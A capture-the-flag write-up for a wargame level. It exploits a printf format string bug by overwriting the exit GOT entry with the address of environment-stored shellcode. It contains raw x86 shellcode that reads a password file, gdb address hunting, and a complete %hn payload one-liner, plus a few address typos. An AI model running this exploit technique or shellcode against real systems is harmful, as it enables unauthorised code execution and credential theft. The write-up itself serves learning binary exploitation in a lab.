# Level05 GOT hijacking and Format String

## Overview

The binary is a very simple program that converts the uppercase letters of the input to lowercase and then executes the string directly with `printf(s)`, allowing a **format string attack**. However, it terminates the program with an `exit(0)`, so we cannot redirect the flow of the program by modifying the `EIP`. So we just need to overwrite the **Global Offset Table** `exit` address to the address of a **shellcode** that we store in an environment variable (`envp`).

### Main Function

```C
int main(int argc, const char **argv, const char **envp)
{
  char s[100];

  fgets(s, 100, stdin);
  for (int i = 0; i < strlen(s); ++i )
  {
    if ( s[i] >= 'A' && s[i] <= 'Z' )  // If uppercase letter
      s[i] ^= 0x20u;                   // Convert to lowercase
  }
  printf(s);
  exit(0);
}
```

## Payload

### Shellcode

We are going to use a simple `cat /home/users/level06/.pass` Shellcode:
```C
cat /home/users/level06/.pass = 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"
```
Exporting it in an environment variable.
```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
```

#### Address

To find out the address of our shellcode, we need to open the program with `gdb` and search it in the environment addresses.

```bash
(gdb) break main
Breakpoint 1 at 0x8048449
(gdb) run
Breakpoint 1, 0x08048449 in main ()
(gdb) x/200s environ 
...
0xffffd890:	 "SHELLCODE=1\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level06/.pass"
...
(gdb) x/s 0xffffd890 + 10
0xffffd89a:	 "1\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level06/.pass"
```

The address of our *shellcode* is: `0xffffd89a`.

### `exit` in the *Global Offset Table*

Now we also need the `exit` address inside the **GOT**.

```bash
(gdb) disassemble exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0   <========
             ^^^^^^
   ...
End of assembler dump.
```

The `exit` address in the **GOT** is `0x80497e0`.

### `printf` Arguments Offset

Now we need to find out in which position in the **stack** our input `buffer` is, to use it in our **format string attack**.

We are goin to use this as an input.

```
aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x
```

#### Breakpoint after `fgets`
We put a breakpoint after receiving the input to print the `buffer` in hexadecimal.
```bash
(gdb) set disassembly-flavor intel 
(gdb) disassemble main 
Dump of assembler code for function main:
    ...
    0x08048475 <+49>:	call   0x8048350 <fgets@plt>
    0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
    ...
(gdb) break *0x0804847a
Breakpoint 1 at 0x804847a
(gdb) run
Starting program: /home/users/level05/level05 
aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x

Breakpoint 1, 0x0804847a in main ()
```

##### Buffer in Hexadecimal
The buffer is stored on the `EAX` register.
```
(gdb) x/8xw $eax
0xffffd688:	0x61616161	0x20782520	0x25207825	0x78252078
0xffffd698:	0x20782520	0x25207825	0x78252078	0x20782520
```
##### Output for Comparison
```
(gdb) continue
Continuing.
aaaa 64 f7fcfac0 f7ec3b11 ffffd6af ffffd6ae 0 ffffffff ffffd734 0 [61616161 20782520 25207825 78252078]
```
As we can see, our input `buffer` is on the **10th** position in the stack.

### Payload Construction

#### Recapitulation

| Shellcode Address | Exit GOT Address |
|-------------------|------------------|
| `0xffffd89a`      | `0x80497e0`      |
| `4294957210`      |                  |
| 

Using the typical format specifier `%n` (saves the number of printed characters in the address of the argument) would be too impractical because it would require to print `4294957210` characters. So we have to split this process at least in 2 (writing `short` by `short`, with `%hn`).

```bash
0xffffd8df = ffff  & d89a
0xffffd8df = 65535 & 55450
addr[2]    = 65535 , 55450
````

##### Splitting script
```bash
split_addr() {
    address="$1"
    half1="${address:0:4}"
    half2="${address:4}" 

    int1=$((0x$half1))
    int2=$((0x$half2))

    echo "$address splits into:"
    echo "$half1 -> $int1"
    echo "$half2 -> $int2"
    echo "n1 = $(($int2 - 8))"
    echo "n2 = $(($int1 - $int2))"
}

$ split_addr ffffd89a
ffffd89a splits into:
ffff -> 65535
d89a -> 55450
n1 = 55442
n2 = 10085
```

#### Format String

```
<Exit GOT Address><Exit GOT Address + 2><addr[1] - 8>d<%10$hn><addr[0]-addr[1]>
```
```
0x80497e0 0x80497e2 (55450-8)d%10$hn (65535-55450)d%10$hn
0x80497e0 0x80497e2 55442d%10$hn 10085d%10$hn
```

```
cat <(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55442d%10\$hn' + '%10085d%11\$hn'") - | ./level05
```